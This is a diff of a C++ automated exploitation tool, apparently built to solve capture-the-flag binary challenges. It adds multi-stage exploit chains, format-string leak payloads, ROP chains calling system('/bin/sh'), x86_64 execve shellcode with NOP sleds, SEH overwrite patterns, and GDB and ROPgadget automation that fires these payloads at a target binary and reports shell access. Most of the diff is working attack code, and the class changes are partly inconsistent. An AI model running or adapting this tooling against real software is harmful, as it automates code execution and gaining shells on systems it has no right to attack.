@@ -289,40 +289,820 @@ public:
     }
 };
 
-class AdaptiveChallengeClassifier {
-public:
-    struct ClassificationResult {
-        std::string challenge_type;
-        std::vector<std::string> vulnerability_types;
-        std::string difficulty_level;
-        std::map<std::string, double> confidence_scores;
-    };
+class ExploitChainBuilder {
+private:
+    std::string target_exe;
+    ELFInfo& elf_info;
+    ExploitContext& context;
     
-    ClassificationResult classifyChallenge(const std::string& binary_info, 
-                                         const std::string& runtime_info, 
-                                         const std::string& gdb_info) {
-        ClassificationResult result;
-        return result;
+public:
+    ExploitChainBuilder(const std::string& exe, ELFInfo& elf, ExploitContext& ctx) 
+        : target_exe(exe), elf_info(elf), context(ctx) {}
+    
+    std::vector<ExploitChain> buildExploitChains() {
+        std::vector<ExploitChain> chains;
+        
+        // Chain 1: Information Leak -> ROP Chain
+        if (elf_info.has_pie || elf_info.has_canary) {
+            chains.push_back(buildInfoLeakROPChain());
+        }
+        
+        // Chain 2: Format String -> Arbitrary Write -> Shell
+        if (hasPrintfFunctions()) {
+            chains.push_back(buildFormatStringChain());
+        }
+        
+        // Chain 3: Heap Leak -> UAF -> Code Execution
+        if (hasHeapFunctions()) {
+            chains.push_back(buildHeapExploitChain());
+        }
+        
+        // Chain 4: Buffer Overflow -> Stack Pivot -> ROP
+        if (!elf_info.has_canary && elf_info.has_nx) {
+            chains.push_back(buildStackPivotChain());
+        }
+        
+        // Chain 5: Race Condition -> Privilege Escalation
+        if (hasThreadingFunctions()) {
+            chains.push_back(buildRaceConditionChain());
+        }
+        
+        return chains;
+    }
+    
+private:
+    ExploitChain buildInfoLeakROPChain() {
+        ExploitChain chain;
+        chain.chain_id = "info_leak_rop";
+        chain.attack_type = "Multi-stage ROP with ASLR bypass";
+        chain.final_objective = "Code execution via ROP chain";
+        
+        // Stage 1: Leak addresses
+        ExploitStage leak_stage;
+        leak_stage.stage_name = "address_leak";
+        leak_stage.payload = generateLeakPayload();
+        leak_stage.success_indicators = {"0x7f", "0x40", "Stack:"};
+        leak_stage.failure_indicators = {"Segmentation", "Aborted"};
+        leak_stage.timeout_seconds = 5;
+        
+        // Stage 2: Calculate offsets
+        ExploitStage calc_stage;
+        calc_stage.stage_name = "offset_calculation";
+        calc_stage.payload = ""; // Will be generated dynamically
+        calc_stage.requires_interaction = true;
+        
+        // Stage 3: ROP chain execution
+        ExploitStage rop_stage;
+        rop_stage.stage_name = "rop_execution";
+        rop_stage.success_indicators = {"$", "shell", "flag{", "success"};
+        rop_stage.failure_indicators = {"Segmentation", "Illegal"};
+        rop_stage.timeout_seconds = 15;
+        
+        chain.stages = {leak_stage, calc_stage, rop_stage};
+        chain.success_probability = 0.7;
+        
+        return chain;
+    }
+    
+    ExploitChain buildFormatStringChain() {
+        ExploitChain chain;
+        chain.chain_id = "format_string_chain";
+        chain.attack_type = "Format string to arbitrary write";
+        chain.final_objective = "Overwrite GOT/return address";
+        
+        // Stage 1: Find format string offset
+        ExploitStage find_offset;
+        find_offset.stage_name = "find_format_offset";
+        find_offset.payload = "AAAA%p%p%p%p%p%p%p%p%p%p";
+        find_offset.success_indicators = {"41414141"};
+        
+        // Stage 2: Leak addresses
+        ExploitStage leak_addrs;
+        leak_addrs.stage_name = "leak_addresses";
+        leak_addrs.success_indicators = {"0x"};
+        
+        // Stage 3: Calculate write targets
+        ExploitStage calc_targets;
+        calc_targets.stage_name = "calculate_targets";
+        calc_targets.requires_interaction = true;
+        
+        // Stage 4: Arbitrary write
+        ExploitStage arb_write;
+        arb_write.stage_name = "arbitrary_write";
+        arb_write.success_indicators = {"success", "shell", "$"};
+        arb_write.timeout_seconds = 10;
+        
+        chain.stages = {find_offset, leak_addrs, calc_targets, arb_write};
+        chain.success_probability = 0.6;
+        
+        return chain;
+    }
+    
+    ExploitChain buildHeapExploitChain() {
+        ExploitChain chain;
+        chain.chain_id = "heap_exploitation";
+        chain.attack_type = "Heap corruption to code execution";
+        
+        ExploitStage heap_spray;
+        heap_spray.stage_name = "heap_spray";
+        heap_spray.payload = generateHeapSprayPayload();
+        
+        ExploitStage trigger_vuln;
+        trigger_vuln.stage_name = "trigger_vulnerability";
+        trigger_vuln.payload = generateHeapCorruptionPayload();
+        
+        ExploitStage exploit_corruption;
+        exploit_corruption.stage_name = "exploit_corruption";
+        exploit_corruption.success_indicators = {"shell", "$", "flag{"};
+        
+        chain.stages = {heap_spray, trigger_vuln, exploit_corruption};
+        chain.success_probability = 0.4;
+        
+        return chain;
+    }
+    
+    ExploitChain buildStackPivotChain() {
+        ExploitChain chain;
+        chain.chain_id = "stack_pivot_rop";
+        chain.attack_type = "Stack pivot to controlled memory";
+        
+        ExploitStage pivot_setup;
+        pivot_setup.stage_name = "setup_pivot_area";
+        pivot_setup.payload = std::string(1000, 'A'); // Large buffer
+        
+        ExploitStage perform_pivot;
+        perform_pivot.stage_name = "stack_pivot";
+        perform_pivot.payload = generateStackPivotPayload();
+        
+        ExploitStage rop_execution;
+        rop_execution.stage_name = "rop_chain";
+        rop_execution.success_indicators = {"shell", "success"};
+        
+        chain.stages = {pivot_setup, perform_pivot, rop_execution};
+        chain.success_probability = 0.5;
+        
+        return chain;
+    }
+    
+    ExploitChain buildRaceConditionChain() {
+        ExploitChain chain;
+        chain.chain_id = "race_condition";
+        chain.attack_type = "Race condition exploitation";
+        
+        ExploitStage setup_race;
+        setup_race.stage_name = "setup_race_condition";
+        setup_race.payload = "START_THREADS";
+        
+        ExploitStage trigger_race;
+        trigger_race.stage_name = "trigger_race";
+        trigger_race.payload = "RACE_TRIGGER";
+        trigger_race.timeout_seconds = 1; // Fast timing
+        
+        ExploitStage exploit_race;
+        exploit_race.stage_name = "exploit_race_window";
+        exploit_race.success_indicators = {"race_won", "success"};
+        
+        chain.stages = {setup_race, trigger_race, exploit_race};
+        chain.success_probability = 0.3;
+        
+        return chain;
+    }
+    
+    // Helper payload generators
+    std::string generateLeakPayload() {
+        if (hasPrintfFunctions()) {
+            return "%p.%p.%p.%p.%p.%p.%p.%p";
+        } else {
+            return std::string(200, 'A'); // Large buffer to leak stack
+        }
+    }
+    
+    std::string generateHeapSprayPayload() {
+        std::string payload = "HEAP_SPRAY:";
+        for (int i = 0; i < 100; i++) {
+            payload += "AAAABBBBCCCCDDDD";
+        }
+        return payload;
+    }
+    
+    std::string generateHeapCorruptionPayload() {
+        return "FREE_CHUNK:" + std::string(64, 'X') + "CORRUPT_HEADER";
+    }
+    
+    std::string generateStackPivotPayload() {
+        std::string payload = std::string(72, 'A'); // Padding
+        // Add pivot gadget (leave rsp, ret or similar)
+        payload += packAddress(0x400000); // Placeholder address
+        return payload;
+    }
+    
+    std::string packAddress(uint64_t addr) {
+        std::string packed;
+        for (int i = 0; i < 8; i++) {
+            packed += static_cast<char>((addr >> (i * 8)) & 0xFF);
+        }
+        return packed;
+    }
+    
+    bool hasPrintfFunctions() {
+        std::vector<std::string> printf_funcs = {"printf", "sprintf", "fprintf"};
+        for (const auto& func : printf_funcs) {
+            if (std::find(elf_info.imported_functions.begin(), 
+                         elf_info.imported_functions.end(), func) != elf_info.imported_functions.end()) {
+                return true;
+            }
+        }
+        return false;
+    }
+    
+    bool hasHeapFunctions() {
+        std::vector<std::string> heap_funcs = {"malloc", "free", "calloc", "realloc"};
+        for (const auto& func : heap_funcs) {
+            if (std::find(elf_info.imported_functions.begin(), 
+                         elf_info.imported_functions.end(), func) != elf_info.imported_functions.end()) {
+                return true;
+            }
+        }
+        return false;
+    }
+    
+    bool hasThreadingFunctions() {
+        std::vector<std::string> thread_funcs = {"pthread_create", "pthread_mutex"};
+        for (const auto& func : thread_funcs) {
+            if (std::find(elf_info.imported_functions.begin(), 
+                         elf_info.imported_functions.end(), func) != elf_info.imported_functions.end()) {
+                return true;
+            }
+        }
+        return false;
     }
 };
+
+
+class AdaptiveExploitGenerator {
+private:
+    ExploitContext context;
+    std::string target_binary;
+    
+public:
+    AdaptiveExploitGenerator(const ExploitContext& ctx, const std::string& binary) 
+        : context(ctx), target_binary(binary) {}
+    
+    // Generate exploit based on analysis
+    std::vector<std::string> generateAdaptiveExploits() {
+        std::vector<std::string> exploits;
+        
+        if (context.exploit_strategy == "info_leak_rop_chain") {
+            exploits = generateInfoLeakROPExploit();
+        } else if (context.exploit_strategy == "rop_chain") {
+            exploits = generateROPChainExploit();
+        } else if (context.exploit_strategy == "shellcode_injection") {
+            exploits = generateShellcodeExploit();
+        } else if (context.exploit_strategy == "seh_overwrite") {
+            exploits = generateSEHExploit();
+        } else if (context.exploit_strategy == "heap_exploitation") {
+            exploits = generateHeapExploit();
+        } else {
+            exploits = generateClassicOverflowExploit();
+        }
+        
+        return exploits;
+    }
+    
+private:
+    std::vector<std::string> generateInfoLeakROPExploit() {
+        std::vector<std::string> exploits;
+        
+        // Stage 1: Information leak
+        std::string leak_payload = generateInfoLeakPayload();
+        exploits.push_back(leak_payload);
+        
+        // Stage 2: ROP chain (will be generated after leak)
+        std::string rop_payload = generateROPPayload();
+        exploits.push_back(rop_payload);
+        
+        return exploits;
+    }
+    
+    std::string generateInfoLeakPayload() {
+        // Generate payload to leak addresses
+        std::string payload;
+        
+        if (hasFunction("printf")) {
+            // Format string leak
+            payload = "%p.%p.%p.%p.%p.%p.%p.%p";
+        } else if (hasFunction("puts")) {
+            // Buffer overflow to leak stack
+            payload = std::string(100, 'A');
+        }
+        
+        return payload;
+    }
+    
+    std::string generateROPPayload() {
+        std::string payload;
+        
+        // Build ROP chain
+        if (hasFunction("system") && !context.gadget_addresses.empty()) {
+            // system("/bin/sh") ROP chain
+            payload += std::string(72, 'A');  // Padding
+            
+            // pop rdi; ret gadget + "/bin/sh" address
+            if (context.gadget_addresses.size() > 0) {
+                uint64_t pop_rdi = context.gadget_addresses[0];  // Assume first is pop rdi
+                payload += packAddress(pop_rdi);
+                payload += packAddress(findStringAddress("/bin/sh"));
+                payload += packAddress(context.symbol_table["system"]);
+            }
+        }
+        
+        return payload;
+    }
+    
+    std::vector<std::string> generateROPChainExploit() {
+        std::vector<std::string> exploits;
+        
+        // Generate various ROP chain attempts
+        for (size_t i = 64; i <= 256; i += 8) {
+            std::string payload = std::string(i, 'A');
+            
+            if (!context.gadget_addresses.empty() && hasFunction("system")) {
+                // Add ROP chain
+                payload += packAddress(context.gadget_addresses[0]);  // pop rdi
+                payload += packAddress(findStringAddress("/bin/sh"));
+                payload += packAddress(context.symbol_table["system"]);
+            }
+            
+            exploits.push_back(payload);
+        }
+        
+        return exploits;
+    }
+    
+    std::vector<std::string> generateShellcodeExploit() {
+        std::vector<std::string> exploits;
+        
+        // x86_64 execve("/bin/sh") shellcode
+        std::string shellcode = 
+            "\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68"
+            "\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05";
+        
+        // NOP sled + shellcode combinations
+        for (int nop_size : {50, 100, 200, 500}) {
+            std::string payload = std::string(nop_size, '\x90') + shellcode;
+            
+            // Add different padding sizes
+            for (size_t pad : {64, 72, 80, 88, 96}) {
+                std::string full_payload = std::string(pad, 'A') + payload;
+                exploits.push_back(full_payload);
+            }
+        }
+        
+        return exploits;
+    }
+    
+    std::vector<std::string> generateSEHExploit() {
+        std::vector<std::string> exploits;
+        
+        // SEH overwrite pattern
+        for (size_t offset : {80, 100, 120, 140}) {
+            std::string payload = std::string(offset, 'A');
+            payload += "BBBB";  // nSEH
+            payload += "CCCC";  // SEH handler
+            exploits.push_back(payload);
+        }
+        
+        return exploits;
+    }
+    
+    std::vector<std::string> generateHeapExploit() {
+        std::vector<std::string> exploits;
+        
+        // Use-after-free patterns  
+        exploits.push_back("malloc_large_chunk");
+        exploits.push_back("free_double");
+        exploits.push_back("heap_overflow");
+        
+        return exploits;
+    }
+    
+    std::vector<std::string> generateClassicOverflowExploit() {
+        std::vector<std::string> exploits;
+        
+        // Classic buffer overflow patterns
+        for (size_t size : {64, 72, 80, 88, 96, 104, 112, 120, 128}) {
+            std::string payload = std::string(size, 'A');
+            payload += "BBBB";  // Return address
+            exploits.push_back(payload);
+        }
+        
+        return exploits;
+    }
+    
+    std::string packAddress(uint64_t addr) {
+        std::string packed;
+        for (int i = 0; i < 8; i++) {
+            packed += static_cast<char>((addr >> (i * 8)) & 0xFF);
+        }
+        return packed;
+    }
+    
+    uint64_t findStringAddress(const std::string& str) {
+        // Try to find string in binary
+        if (str == "/bin/sh" && context.symbol_table.count("str_bin_sh")) {
+            return context.symbol_table["str_bin_sh"];
+        }
+        return 0x7ffff7b84d57;  // Common libc /bin/sh address (needs proper leak)
+    }
+    
+    bool hasFunction(const std::string& func) {
+        return context.symbol_table.count(func) > 0;
+    }
+};
+
 
 class AdvancedGDBAnalyzer {
 private:
-    std::string target_executable;
+    std::string target_binary;
+    ExploitContext context;
     
 public:
-    AdvancedGDBAnalyzer(const std::string& exe) : target_executable(exe) {}
+    AdvancedGDBAnalyzer(const std::string& binary) : target_binary(binary) {}
     
+    // Comprehensive binary analysis using GDB
     ExploitContext performDeepAnalysis() {
-        ExploitContext context;
+        std::cout << "[*] Starting deep GDB analysis..." << std::endl;
+        
+        // Step 1: Extract all symbols and addresses
+        extractSymbolInformation();
+        
+        // Step 2: Analyze mitigations
+        analyzeMitigations();
+        
+        // Step 3: Find ROP gadgets
+        findROPGadgets();
+        
+        // Step 4: Detect SEH chains (Windows)
+        detectSEHChains();
+        
+        // Step 5: Analyze heap layout
+        analyzeHeapLayout();
+        
+        // Step 6: Find exploitable functions
+        identifyExploitableFunctions();
+        
+        // Step 7: Build exploit strategy
+        buildExploitStrategy();
+        
         return context;
     }
     
-    std::string getDetailedAnalysis() {
-        return "GDB Analysis";
+    void extractSymbolInformation() {
+        std::string gdb_script = R"(
+set pagination off
+set logging file symbols.txt
+set logging on
+info functions
+info variables
+info address main
+info address system
+info address printf
+info address gets
+info address strcpy
+maintenance info sections
+quit
+        )";
+        
+        writeGDBScript(gdb_script, "extract_symbols.gdb");
+        std::string output = executeGDB("extract_symbols.gdb");
+        parseSymbolOutput(output);
+    }
+    
+    void analyzeMitigations() {
+        std::string gdb_script = R"(
+set pagination off
+set logging file mitigations.txt
+set logging on
+checksec
+info proc mappings
+show environment
+quit
+        )";
+        
+        writeGDBScript(gdb_script, "check_mitigations.gdb");
+        std::string output = executeGDB("check_mitigations.gdb");
+        parseMitigationOutput(output);
+        
+        // Also use external tools
+        std::string checksec_output = executeCommand("checksec --file=" + target_binary);
+        parseChecksecOutput(checksec_output);
+    }
+    
+    void findROPGadgets() {
+        std::cout << "[*] Searching for ROP gadgets..." << std::endl;
+        
+        // Use ropper or ROPgadget
+        std::string rop_cmd = "ropper --file " + target_binary + " --search 'pop r?i; ret' 2>/dev/null";
+        std::string rop_output = executeCommand(rop_cmd);
+        
+        if (rop_output.empty()) {
+            rop_cmd = "ROPgadget --binary " + target_binary + " --only 'pop|ret' 2>/dev/null";
+            rop_output = executeCommand(rop_cmd);
+        }
+        
+        parseROPGadgets(rop_output);
+        
+        // Also find gadgets using GDB
+        findGadgetsWithGDB();
+    }
+    
+    void findGadgetsWithGDB() {
+        std::string gdb_script = R"(
+set pagination off
+set logging file gadgets.txt
+set logging on
+# Search for common ROP gadgets
+x/1000i main
+# Look for pop; ret sequences
+find 0x400000, 0x500000, 0x58c3  # pop rax; ret
+find 0x400000, 0x500000, 0x5fc3  # pop rdi; ret  
+find 0x400000, 0x500000, 0x5ec3  # pop rsi; ret
+find 0x400000, 0x500000, 0x5ac3  # pop rdx; ret
+quit
+        )";
+        
+        writeGDBScript(gdb_script, "find_gadgets.gdb");
+        executeGDB("find_gadgets.gdb");
+    }
+    
+    void detectSEHChains() {
+        // Windows-specific SEH detection
+        std::string gdb_script = R"(
+set pagination off
+set logging file seh.txt
+set logging on
+# Check for SEH structures
+x/10gx $fs:0
+info registers fs
+# Look for exception handlers
+maintenance info sections .pdata
+maintenance info sections .xdata
+quit
+        )";
+        
+        writeGDBScript(gdb_script, "detect_seh.gdb");
+        executeGDB("detect_seh.gdb");
+        context.has_seh = checkSEHPresence();
+    }
+    
+    void analyzeHeapLayout() {
+        std::string gdb_script = R"(
+set pagination off
+set logging file heap.txt
+set logging on
+# Analyze heap layout
+info proc mappings
+heap chunks
+heap bins
+# Check for heap protections
+show environment MALLOC_CHECK_
+show environment MALLOC_PERTURB_
+quit
+        )";
+        
+        writeGDBScript(gdb_script, "analyze_heap.gdb");
+        executeGDB("analyze_heap.gdb");
+    }
+    
+    void identifyExploitableFunctions() {
+        std::vector<std::string> dangerous_funcs = {
+            "gets", "strcpy", "strcat", "sprintf", "scanf", "strncpy",
+            "memcpy", "memmove", "printf", "fprintf", "snprintf"
+        };
+        
+        for (const auto& func : dangerous_funcs) {
+            if (context.symbol_table.count(func)) {
+                context.exploitable_functions.push_back(func);
+            }
+        }
+    }
+    
+    void buildExploitStrategy() {
+        std::cout << "[*] Building adaptive exploit strategy..." << std::endl;
+        
+        // Determine best exploitation approach
+        if (context.mitigations["canary"] && context.mitigations["nx"] && context.mitigations["aslr"]) {
+            if (!context.gadget_addresses.empty()) {
+                context.exploit_strategy = "info_leak_rop_chain";
+                std::cout << "[+] Strategy: Information leak + ROP chain" << std::endl;
+            } else {
+                context.exploit_strategy = "heap_exploitation";
+                std::cout << "[+] Strategy: Heap exploitation" << std::endl;
+            }
+        } else if (context.mitigations["nx"] && !context.mitigations["aslr"]) {
+            context.exploit_strategy = "rop_chain";
+            std::cout << "[+] Strategy: ROP chain" << std::endl;
+        } else if (!context.mitigations["nx"]) {
+            context.exploit_strategy = "shellcode_injection";
+            std::cout << "[+] Strategy: Direct shellcode injection" << std::endl;
+        } else if (context.has_seh) {
+            context.exploit_strategy = "seh_overwrite";
+            std::cout << "[+] Strategy: SEH overwrite" << std::endl;
+        } else {
+            context.exploit_strategy = "classic_overflow";
+            std::cout << "[+] Strategy: Classic buffer overflow" << std::endl;
+        }
+    }
+    
+private:
+    void writeGDBScript(const std::string& script, const std::string& filename) {
+        std::ofstream file(filename);
+        file << script;
+        file.close();
+    }
+    
+    std::string executeGDB(const std::string& script_file) {
+        std::string cmd = "gdb -batch -x " + script_file + " " + target_binary + " 2>&1";
+        return executeCommand(cmd);
+    }
+    
+    std::string executeCommand(const std::string& cmd) {
+        char buffer[128];
+        std::string result = "";
+        FILE* pipe = popen(cmd.c_str(), "r");
+        if (!pipe) return result;
+        
+        while (fgets(buffer, sizeof(buffer), pipe) != nullptr) {
+            result += buffer;
+        }
+        pclose(pipe);
+        return result;
+    }
+    
+    void parseSymbolOutput(const std::string& output) {
+        std::regex addr_regex(R"(0x([0-9a-fA-F]+)\s+(\w+))");
+        std::smatch match;
+        std::string::const_iterator searchStart(output.cbegin());
+        
+        while (std::regex_search(searchStart, output.cend(), match, addr_regex)) {
+            uint64_t addr = std::stoull(match[1].str(), nullptr, 16);
+            std::string symbol = match[2].str();
+            context.symbol_table[symbol] = addr;
+            searchStart = match.suffix().first;
+        }
+    }
+    
+    void parseMitigationOutput(const std::string& output) {
+        context.mitigations["canary"] = output.find("canary") != std::string::npos;
+        context.mitigations["nx"] = output.find("NX") != std::string::npos;
+        context.mitigations["aslr"] = output.find("ASLR") != std::string::npos;
+        context.mitigations["pie"] = output.find("PIE") != std::string::npos;
+        context.mitigations["relro"] = output.find("RELRO") != std::string::npos;
+        context.mitigations["fortify"] = output.find("FORTIFY") != std::string::npos;
+    }
+    
+    void parseChecksecOutput(const std::string& output) {
+        context.mitigations["canary"] = output.find("Canary found") != std::string::npos;
+        context.mitigations["nx"] = output.find("NX enabled") != std::string::npos;
+        context.mitigations["pie"] = output.find("PIE enabled") != std::string::npos;
+        context.mitigations["relro"] = output.find("Full RELRO") != std::string::npos;
+    }
+    
+    void parseROPGadgets(const std::string& output) {
+        std::regex gadget_regex(R"(0x([0-9a-fA-F]+):\s+(.+))");
+        std::smatch match;
+        std::string::const_iterator searchStart(output.cbegin());
+        
+        while (std::regex_search(searchStart, output.cend(), match, gadget_regex)) {
+            uint64_t addr = std::stoull(match[1].str(), nullptr, 16);
+            context.gadget_addresses.push_back(addr);
+            searchStart = match.suffix().first;
+        }
+        
+        std::cout << "[+] Found " << context.gadget_addresses.size() << " ROP gadgets" << std::endl;
+    }
+    
+    bool checkSEHPresence() {
+        // Check if binary has SEH support (Windows)
+        std::string output = executeCommand("objdump -h " + target_binary + " 2>/dev/null");
+        return output.find(".pdata") != std::string::npos || 
+               output.find(".xdata") != std::string::npos;
     }
 };
 
+class SymbolicExecutionEngine {
+    
+private:
+    std::string target_binary;
+    std::string angr_script_template;
+    std::vector<std::string> target_functions;
+    std::vector<std::string> avoid_functions;
+    
+public:
+    SymbolicExecutionEngine(const std::string& binary);
+    void setupAngrEnvironment();
+    void createAngrScriptTemplate();
+    
+    // Add these missing method declarations:
+    void findFlagStrings(SymbolicResult& result);
+    void findVulnerabilityPaths(SymbolicResult& result);
+    SymbolicResult performSymbolicExecution(const std::vector<std::string>& find_strings, 
+                                           const std::vector<std::string>& avoid_strings);
+    
+private:
+    std::string executeCommand(const std::string& cmd);
+    std::string executeCommandWithTimeout(const std::string& cmd, int timeout_seconds);
+    void parseSymbolicResults(const std::string& output, SymbolicResult& result);
+}; 
+
+class AdaptiveChallengeClassifier {
+private:
+    std::map<std::string, std::vector<std::string>> challenge_signatures;
+    std::map<std::string, double> confidence_scores;
+    
+public:
+    AdaptiveChallengeClassifier() {
+        initializeSignatures();
+    }
+    
+    void initializeSignatures() {
+        // Binary exploitation signatures
+        challenge_signatures["buffer_overflow"] = {
+            "gets", "strcpy", "sprintf", "scanf", "strcat", "memcpy",
+            "stack smashing", "buffer overflow", "segmentation fault"
+        };
+        
+        challenge_signatures["format_string"] = {
+            "printf", "fprintf", "sprintf", "snprintf", "%n", "%s", "%x", "%p"
+        };
+        
+        challenge_signatures["heap_exploitation"] = {
+            "malloc", "free", "realloc", "calloc", "use after free", "double free"
+        };
+        
+        challenge_signatures["rop_required"] = {
+            "NX enabled", "DEP", "non-executable", "gadget", "return-oriented"
+        };
+        
+        challenge_signatures["seh_exploitation"] = {
+            "structured exception", "SEH", "exception handler", "try", "catch"
+        };
+        
+        challenge_signatures["crypto_challenge"] = {
+            "encrypt", "decrypt", "cipher", "hash", "key", "AES", "RSA", "base64"
+        };
+        
+        challenge_signatures["reverse_engineering"] = {
+            "password", "license", "serial", "crack", "reverse", "disassemble"
+        };
+        
+        challenge_signatures["race_condition"] = {
+            "thread", "pthread", "race", "timing", "signal", "concurrent"
+        };
+    }
+    
+    std::vector<std::pair<std::string, double>> classifyChallenge(
+        const std::string& binary_analysis,
+        const std::string& runtime_behavior,
+        const std::string& gdb_output) {
+        
+        std::vector<std::pair<std::string, double>> classifications;
+        std::string combined_data = binary_analysis + " " + runtime_behavior + " " + gdb_output;
+        
+        for (const auto& category : challenge_signatures) {
+            double score = calculateConfidence(combined_data, category.second);
+            if (score > 0.3) {  // Threshold for consideration
+                classifications.push_back({category.first, score});
+            }
+        }
+        
+        // Sort by confidence
+        std::sort(classifications.begin(), classifications.end(),
+                 [](const auto& a, const auto& b) { return a.second > b.second; });
+        
+        return classifications;
+    }
+    
+private:
+    double calculateConfidence(const std::string& data, const std::vector<std::string>& signatures) {
+        double matches = 0;
+        double total = signatures.size();
+        
+        std::string lower_data = data;
+        std::transform(lower_data.begin(), lower_data.end(), lower_data.begin(), ::tolower);
+        
+        for (const auto& sig : signatures) {
+            std::string lower_sig = sig;
+            std::transform(lower_sig.begin(), lower_sig.end(), lower_sig.begin(), ::tolower);
+            
+            if (lower_data.find(lower_sig) != std::string::npos) {
+                matches += 1.0;
+            }
+        }
+        
+        return matches / total;
+    }
+};
 
 
 
@@ -414,6 +1194,50 @@ public:
     return result;
 }
 
+void performMultiStageExploitation() {
+    if (!multi_stage_mode) return;
+    
+    std::cout << "[*] ===== MULTI-STAGE EXPLOIT CHAINING =====" << std::endl;
+    
+    ExploitChainBuilder builder(target_exe, elf_info, exploit_context);
+    exploit_chains = builder.buildExploitChains();
+    
+    std::cout << "[+] Built " << exploit_chains.size() << " exploit chains" << std::endl;
+    
+    for (auto& chain : exploit_chains) {
+        std::cout << "\n[*] Testing chain: " << chain.chain_id 
+                  << " (" << chain.attack_type << ")" << std::endl;
+        std::cout << "[*] Success probability: " << chain.success_probability << std::endl;
+        
+        ChainResult result = executeExploitChain(chain);
+        
+        if (result.successful) {
+            std::cout << "[!] SUCCESS! Chain completed successfully!" << std::endl;
+            std::cout << "[+] Stages completed: " << result.stages_completed << std::endl;
+            
+            if (!result.final_flag.empty()) {
+                std::cout << "[!] FLAG CAPTURED: " << result.final_flag << std::endl;
+                saveSolution(chain.stages.back().payload, result.final_flag);
+            }
+            
+            if (!result.shell_access.empty()) {
+                std::cout << "[!] SHELL ACCESS GAINED!" << std::endl;
+            }
+            
+            saveChainResult(result);
+            generateChainPoC(chain, result);
+            
+            // If we got the flag or shell, we're done
+            if (!result.final_flag.empty() || !result.shell_access.empty()) {
+                return;
+            }
+        } else {
+            std::cout << "[!] Chain failed: " << chain.failure_reason << std::endl;
+            std::cout << "[*] Completed stages: " << result.stages_completed 
+                      << "/" << chain.stages.size() << std::endl;
+        }
+    }
+}
 
     void initializeComponents() {
         // Initialize ELF info
@@ -687,7 +1511,63 @@ public:
             }
         }
     }
+    void testAdaptiveExploits(const std::vector<std::string>& exploits) {
+    std::cout << "[*] Testing " << exploits.size() << " adaptive exploits..." << std::endl;
     
+    int successful_exploits = 0;
+    int crashes_found = 0;
+    
+    for (size_t i = 0; i < exploits.size(); i++) {
+        if (verbose_mode && i % 10 == 0) {
+            std::cout << "[*] Testing exploit " << i + 1 << "/" << exploits.size() << std::endl;
+        }
+        
+        VulnResult result;
+        result.input = exploits[i];
+        result.payload_size = exploits[i].size();
+        
+        // Test the exploit
+        bool crashed = testSingleExploit(exploits[i], result);
+        
+        if (crashed) {
+            crashes_found++;
+            vulnerabilities.push_back(result);
+            
+            std::cout << "[!] Crash found with adaptive exploit #" << i + 1 << std::endl;
+            std::cout << "    Signal: " << result.signal_num << std::endl;
+            std::cout << "    Type: " << result.vuln_type << std::endl;
+            
+            // Save detailed results
+            saveAdvancedVulnerability(result, i);
+            
+            if (result.exploitable) {
+                successful_exploits++;
+                generateAdvancedPoC(result, i);
+                std::cout << "[+] Exploitable vulnerability confirmed!" << std::endl;
+            }
+        }
+        
+        // Check for successful exploitation (non-crash success)
+        std::string output = captureOutput(exploits[i]);
+        if (isSuccessfulExploit(output)) {
+            successful_exploits++;
+            std::cout << "[!] SUCCESS! Adaptive exploit worked!" << std::endl;
+            std::cout << "[+] Output: " << output << std::endl;
+            
+            // Save successful solution
+            saveSolution(exploits[i], output);
+            generateSolutionScript(exploits[i]);
+        }
+        
+        std::this_thread::sleep_for(std::chrono::milliseconds(10));
+    }
+    
+    std::cout << "[*] Adaptive exploit testing complete:" << std::endl;
+    std::cout << "    Total exploits tested: " << exploits.size() << std::endl;
+    std::cout << "    Crashes found: " << crashes_found << std::endl;
+    std::cout << "    Successful exploits: " << successful_exploits << std::endl;
+}
+
     void generateShellcodePayloads(std::vector<std::string>& payloads) {
         // NOP sleds with shellcode placeholders
         std::vector<std::string> shellcodes = {
@@ -714,7 +1594,55 @@ public:
         
         payloads.insert(payloads.end(), leak_patterns.begin(), leak_patterns.end());
     }
+
+    ChainResult executeExploitChain(ExploitChain& chain) {
+    ChainResult result;
+    result.chain_id = chain.chain_id;
+    result.successful = false;
+    result.stages_completed = 0;
     
+    std::cout << "[*] Executing " << chain.stages.size() << " stage chain..." << std::endl;
+    
+    for (size_t i = 0; i < chain.stages.size(); i++) {
+        auto& stage = chain.stages[i];
+        std::cout << "[*] Stage " << (i+1) << ": " << stage.stage_name << std::endl;
+        
+        StageResult stage_result = executeStage(stage, leaked_data);
+        result.stage_outputs.push_back(stage_result.output);
+        
+        if (!stage_result.successful) {
+            chain.failure_reason = "Stage " + std::to_string(i+1) + " failed: " + stage_result.error;
+            std::cout << "[!] " << chain.failure_reason << std::endl;
+            return result;
+        }
+        
+        result.stages_completed++;
+        
+        // Extract data from this stage for next stages
+        extractStageData(stage_result, leaked_data);
+        
+        // Update subsequent stage payloads based on leaked data
+        updateSubsequentStages(chain, i, leaked_data);
+        
+        // Check for early success indicators
+        if (checkEarlySuccess(stage_result.output)) {
+            result.final_flag = extractFlag(stage_result.output);
+            result.shell_access = extractShellAccess(stage_result.output);
+            result.successful = true;
+            return result;
+        }
+        
+        std::this_thread::sleep_for(std::chrono::milliseconds(500));
+    }
+    
+    // All stages completed successfully
+    result.successful = true;
+    result.final_flag = extractFlag(result.stage_outputs.back());
+    result.shell_access = extractShellAccess(result.stage_outputs.back());
+    
+    return result;
+}
+
     void generateFunctionSpecificPayloads(const std::string& func, std::vector<std::string>& payloads) {
         if (func == "gets" || func == "strcpy") {
             // These functions are especially vulnerable to buffer overflows
@@ -1580,389 +2508,9 @@ void AdvancedCTFSolver::saveSolution(const std::string& payload, const std::stri
 
 
 // AI-driven challenge classification system
-class AdaptiveChallengeClassifier {
-private:
-    std::map<std::string, std::vector<std::string>> challenge_signatures;
-    std::map<std::string, double> confidence_scores;
-    
-public:
-    AdaptiveChallengeClassifier() {
-        initializeSignatures();
-    }
-    
-    void initializeSignatures() {
-        // Binary exploitation signatures
-        challenge_signatures["buffer_overflow"] = {
-            "gets", "strcpy", "sprintf", "scanf", "strcat", "memcpy",
-            "stack smashing", "buffer overflow", "segmentation fault"
-        };
-        
-        challenge_signatures["format_string"] = {
-            "printf", "fprintf", "sprintf", "snprintf", "%n", "%s", "%x", "%p"
-        };
-        
-        challenge_signatures["heap_exploitation"] = {
-            "malloc", "free", "realloc", "calloc", "use after free", "double free"
-        };
-        
